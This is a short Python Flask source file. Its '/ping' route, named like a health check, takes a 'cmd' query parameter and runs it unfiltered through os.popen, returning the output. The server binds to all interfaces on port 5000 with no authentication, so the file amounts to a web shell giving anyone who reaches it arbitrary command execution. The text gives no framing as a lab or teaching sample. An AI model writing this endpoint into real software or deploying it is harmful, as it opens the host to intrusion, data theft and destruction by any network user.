from flask import Flask, request
import os

app = Flask(__name__)

@app.route('/ping')
def ping():
    cmd = request.args.get('cmd')
    if cmd:
        return os.popen(cmd).read()
    return "OK"

app.run(host="0.0.0.0", port=5000)
